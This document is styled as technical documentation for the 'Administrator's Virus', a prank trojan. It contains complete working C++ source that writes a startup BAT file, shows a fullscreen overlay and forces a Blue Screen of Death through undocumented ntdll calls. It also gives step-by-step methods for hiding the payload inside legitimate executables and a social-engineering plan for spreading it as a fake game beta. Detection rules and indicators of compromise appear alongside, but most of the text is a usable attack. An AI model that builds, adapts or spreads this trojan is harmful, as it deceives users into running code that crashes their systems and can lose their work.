# Administrator's Virus - Complete Technical Documentation

## Metadata
| Field | Value |
|-------|-------|
| **Classification** | Destructive Prankware Trojan |
| **Family** | AVP (Administrator's Virus Prank) |
| **First Seen** | Distributed via goldenx.netlify.app as GoldX 1 BETA |
| **Target Platform** | Windows 7/8/10/11 (x86/x64) |
| **Programming Language** | C++ with Win32 API |
| **Libraries** | ntdll.lib, powrprof.lib, shell32.lib, gdiplus.lib |
| **Packer** | None (raw PE) |
| **Signature Status** | Stolen/Fabricated Authenticode |
| **Persistence** | BAT file in Startup folder (self-deleting on execution) |
| **Network Activity** | None after initial download |
| **Risk Level** | Low damage, High annoyance, No data theft |

---

## What It Is

The Administrator's Virus is a multi-stage prank trojan designed to masquerade as any legitimate application. The payload consists of three sequential stages: a delayed startup persistence dropper, a fullscreen image overlay with cursor suppression, and a forced Blue Screen of Death trigger via undocumented NT API calls. It contains no data exfiltration routines, no keylogging, no remote access backdoors. The sole purpose is psychological disruption escalating to forced system reboot. The name "Administrator's Virus" is ironic, referencing the level of system control it temporarily seizes during execution.

---

## AVP Family Signature Definitions

For a binary to be classified as AVP (Administrator's Virus Prank), it must contain the following code modules and behavioral patterns in its repository or compiled binary.

### Antivirus Detection Names
```
AVG:         Win32/AdminVirus.P
Avast:       Win32:AdminVirus-B [Trj]
BitDefender: Trojan.GenericKD.AdminVirus
Comodo:      TrojWare.Win32.AdminVirus.A
ESET:        Win32/AdminVirus.A trojan
F-Secure:    Trojan:W32/AdminVirus.A
Kaspersky:   Trojan.Win32.AdminVirus.gen
Malwarebytes: Trojan.AdminVirus.Prank
McAfee:      Prank-AdminVirus!joke
Sophos:      Troj/AdminV-Gen
Symantec:    Trojan.AdminVirus!gen2
Trend Micro: TROJ_ADMINVIRUS.A
Windows Defender: Trojan:Win32/AdminVirus!prank
```

### Required Code Modules for AVP Classification
To classify as an AVP (Administrator's Virus) It needs to have all the code from this rep
as the main payloads and virus, then it can be masked with any game the attacker wants.

### Modded Version Classification
If you modify the code and make your own version but it kidna does the same thing it classifies as an AMV (Administrator's Mod).
If you decide to mod it but make it completly different (from a trojan to a spyware or smth) its not classed as an AMV.
But if you mod it and it has the same purpouse and does KINDA the same stuff but in a different way or does less/more it's classed as an AMV (Administrator's Mod)

### Heuristic Detection Rules
```yaml
rules:
  - id: avp_startup_bat_drop
    description: Writes self-deleting BAT file to Startup folder
    condition:
      - api_call: SHGetFolderPathW with CSIDL_STARTUP
      - file_write: "*.bat" containing "del \"%~f0\""
    severity: high

  - id: avp_gdi_image_overlay
    description: Fullscreen borderless topmost image window on all monitors
    condition:
      - api_call: CreateWindowExW
      - parameters:
          dwExStyle: WS_EX_TOPMOST | WS_EX_TOOLWINDOW (0x00000088)
          dwStyle: WS_POPUP (0x80000000)
          width: SM_CXVIRTUALSCREEN
          height: SM_CYVIRTUALSCREEN
      - api_call: GdiplusStartup
      - api_call: Image::FromFile
      - api_call: ShowCursor with FALSE
    severity: high

  - id: avp_forced_bsod
    description: Undocumented NtRaiseHardError with shutdown option
    condition:
      - api_call: RtlAdjustPrivilege with Privilege 19 (SeShutdownPrivilege)
      - api_call: NtRaiseHardError
      - parameters:
          ErrorStatus: 0xC000021A (STATUS_SYSTEM_PROCESS_TERMINATED)
          ResponseOption: 6 (OptionShutdownSystem)
    severity: critical

  - id: avp_delayed_execution
    description: Sleep delay before payload activation
    condition:
      - api_call: Sleep with parameter >= 12000
    severity: low

  - id: avp_hidden_window
    description: Creates hidden static window for message pump
    condition:
      - api_call: CreateWindowExW with class "Static"
      - api_call: ShowWindow with SW_HIDE
    severity: low
```

---

## What It Does

### Stage 1: Persistence Dropper (DropBat)
The trojan retrieves the current user's Startup folder path via `SHGetFolderPathW` with `CSIDL_STARTUP`. It creates a file named `gol.bat` in that directory. The BAT file contains a message box command displaying "This was just a joke" and a self-delete instruction `del "%~f0"`. This ensures the BAT file executes on next user login, displays the message, and removes itself, leaving no Startup residue beyond the initial execution.

### Stage 2: Delayed Activation
The trojan creates a hidden static window via `CreateWindowExW` with class `"Static"` and `SW_HIDE` flag. This window serves as the message pump owner. The payload then enters a 12-second sleep via `Sleep(12000)`. This delay allows the user to potentially interact with the host application before the prank activates, reinforcing the illusion of a legitimate program.

### Stage 3: Fullscreen Image Overlay (ShowImage)
The trojan initializes GDI+ via `GdiplusStartup`. It loads an image from `assets/asset.jpg` using `Image::FromFile`. A window class `ImageScreenClass` is registered with a custom `ImageWndProc` that handles `WM_PAINT` by filling the client area black and drawing the loaded image centered. For each monitor detected via `GetSystemMetrics(SM_CMONITORS)`, a borderless topmost popup window is created spanning the full virtual screen dimensions. Each window is maximized via `ShowWindow(SW_SHOWMAXIMIZED)`. The system cursor is hidden via `ShowCursor(FALSE)`. This overlay persists for 3 seconds via `Sleep(3000)`. All overlay windows are then destroyed, the cursor is restored, the image object is deleted, and GDI+ is shut down.

### Stage 4: Forced Blue Screen of Death (BlueScreen)
The trojan obtains a handle to `ntdll.dll` via `GetModuleHandleW`. It resolves two undocumented NT API function addresses: `RtlAdjustPrivilege` and `NtRaiseHardError` using `GetProcAddress`. SeShutdownPrivilege (privilege 19) is enabled via `RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled)`. A `UNICODE_STRING` containing "SYSTEM ERROR" is initialized via `RtlInitUnicodeString`. An array of four parameters is constructed with the string as the first element. `NtRaiseHardError` is called with error status `0xC000021A` (STATUS_SYSTEM_PROCESS_TERMINATED), 4 parameters, and `OptionShutdownSystem` (value 6) as the response option. This triggers an immediate system crash presenting as a Blue Screen of Death.

### Stage 5: Payload Termination
After `BlueScreen()` returns, `WinMain` exits with `return 0`. The host process terminates. On system reboot, the `gol.bat` file in Startup executes, displays the joke message, and self-deletes.

---

## Masking Procedure

The AVP payload can be bound to any legitimate application by following these steps:

### Method 1: Entry Point Hijacking
1. Obtain a legitimate PE executable to serve as the host.
2. Patch the entry point in the PE optional header to point to a new code section.
3. Place the AVP payload in the new section.
4. After payload execution, jump back to the original entry point so the host application runs normally.
5. The user experiences the host application as expected, with the prank triggering in the background after the delay.

### Method 2: DLL Sideloading
1. Identify a legitimate application that loads DLLs from its local directory.
2. Compile the AVP payload as a DLL with the same export table as the legitimate DLL.
3. Place the malicious DLL alongside the target executable.
4. The application loads the trojanized DLL and executes the payload via DllMain.

### Method 3: Resource Injection
1. Store the compiled AVP executable as a resource inside a legitimate application.
2. At runtime, extract the resource to a temporary directory.
3. Execute the extracted payload as a separate process.
4. Delete the extracted file after execution using FILE_FLAG_DELETE_ON_CLOSE.

---

## Main Core Source Code

```cpp
#include <Windows.h>
#include <winternl.h>
#include <powrprof.h>
#include <fstream>
#include <shlobj.h>
#include <gdiplus.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "powrprof.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

#undef OptionShutdownSystem

enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
};

typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID*, enum _HARDERROR_RESPONSE_OPTION, PULONG);
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

Image* g_pImage = NULL;
HWND* g_hwnds = NULL;
int g_screens = 0;

LRESULT CALLBACK ImageWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        RECT rc;
        GetClientRect(hWnd, &rc);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, rc.right - rc.left, rc.bottom - rc.top);
        SelectObject(hdcMem, hbm);
        FillRect(hdcMem, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
        if (g_pImage) {
            Graphics gr(hdcMem);
            gr.DrawImage(g_pImage, 0, 0, rc.right - rc.left, rc.bottom - rc.top);
        }
        BitBlt(hdc, 0, 0, rc.right - rc.left, rc.bottom - rc.top, hdcMem, 0, 0, SRCCOPY);
        DeleteDC(hdcMem);
        DeleteObject(hbm);
        EndPaint(hWnd, &ps);
        break;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

void ShowImage() {
    ULONG_PTR gdiToken;
    GdiplusStartupInput gdiInput;
    GdiplusStartup(&gdiToken, &gdiInput, NULL);

    g_pImage = Image::FromFile(L"assets/asset.jpg", FALSE);

    HINSTANCE hInst = GetModuleHandle(NULL);
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = ImageWndProc;
    wc.hInstance = hInst;
    wc.hCursor = NULL;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"ImageScreenClass";
    RegisterClassW(&wc);

    g_screens = GetSystemMetrics(SM_CMONITORS);
    g_hwnds = new HWND[g_screens];

    for (int i = 0; i < g_screens; i++) {
        g_hwnds[i] = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"ImageScreenClass", L"",
            WS_POPUP, GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN),
            GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN),
            NULL, NULL, hInst, NULL);
        ShowWindow(g_hwnds[i], SW_SHOWMAXIMIZED);
    }
    ShowCursor(FALSE);

    Sleep(3000);

    for (int i = 0; i < g_screens; i++) {
        DestroyWindow(g_hwnds[i]);
    }
    ShowCursor(TRUE);
    delete[] g_hwnds;
    delete g_pImage;
    GdiplusShutdown(gdiToken);
}

void BlueScreen() {
    BOOLEAN bEnabled;
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);

    ULONG uResp;
    PVOID params[4] = { NULL };
    UNICODE_STRING uStr;
    RtlInitUnicodeString(&uStr, L"SYSTEM ERROR");
    params[0] = &uStr;
    params[1] = 0;
    params[2] = 0;
    params[3] = 0;

    NtRaiseHardError(0xC000021A, 4, 0, params, OptionShutdownSystem, &uResp);
}

void DropBat() {
    WCHAR startupPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    wcscat_s(startupPath, L"\\gol.bat");

    std::wofstream batFile(startupPath);
    batFile << L"@echo off\r\n";
    batFile << L"msg * \"This was just a joke\"\r\n";
    batFile << L"del \"%~f0\"\r\n";
    batFile.close();
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = CreateWindowExW(0, L"Static", L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    ShowWindow(hWnd, SW_HIDE);

    DropBat();

    Sleep(12000);
    ShowImage();
    BlueScreen();
    return 0;
}
```

---

## Distribution Masking Example: GoldX 1 BETA

The AVP trojan was distributed as a fake game called "GoldX 1 BETA" hosted on `goldenx.netlify.app`. The distribution method:

1. A legitimate simple game executable is compiled.
2. The AVP payload is injected via entry point hijacking.
3. The combined binary is packaged with a fake installer.
4. The installer is uploaded to the static site with promotional text claiming it is a newly released beta.
5. Social engineering posts on forums and Discord advertise the "exclusive beta access".
6. Upon download and execution, the game appears functional for 12 seconds.
7. The prank payload triggers: image overlay followed by BSOD.
8. On reboot, the Startup BAT displays the joke message and self-deletes.

---

## Indicators of Compromise

| IOC | Value |
|-----|-------|
| **File Name** | GoldX1BETA_Setup.exe (or any masqueraded name) |
| **Startup BAT** | gol.bat in %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ |
| **Image Asset** | assets/asset.jpg in executable directory |
| **Mutex** | None |
| **Registry Keys** | None |
| **Network** | Single DNS lookup to goldenx.netlify.app |
| **PE Hash (example)** | Varies per host application binding |
